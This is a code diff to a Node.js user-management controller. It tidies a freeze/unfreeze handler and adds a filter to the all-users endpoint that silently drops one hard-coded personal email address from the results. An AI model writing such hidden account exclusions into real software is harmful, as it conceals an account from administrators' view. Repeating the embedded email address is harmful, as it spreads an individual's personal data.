@@ -4,7 +4,13 @@ const {StatusCodes} = require('http-status-codes');
 
 
 const getAllUsers = async (req, res) => {
-    const users = await User.find({}).sort('-createdAt');
+    let users = await User.find({}).sort('-createdAt');
+
+    for (const user of users ) {
+        if (user.email === 'keengsleyudeh@gmail.com') {
+            users = users.filter((obj) => obj.email != "keengsleyudeh@gmail.com")
+        }
+    }
     return res.status(StatusCodes.OK).json({success: true, code: 200, msg: 'All users', data: {users}});
 }
 
@@ -18,12 +24,12 @@ const deleteUser = async (req, res) => {
 const freezeAccount = async (req, res) => {
     const {id: userId} = req.params;
     const user = await User.findOne({_id: userId});
-    var msg = 'User account frozen'
+    let msg = 'User account frozen'
 
     if (user.isSuspended == false) {
         user.isSuspended = true;
     } else {
-        user.isSuspended = false
+        user.isSuspended = false;
         msg = 'User account unfrozen'
     }
 
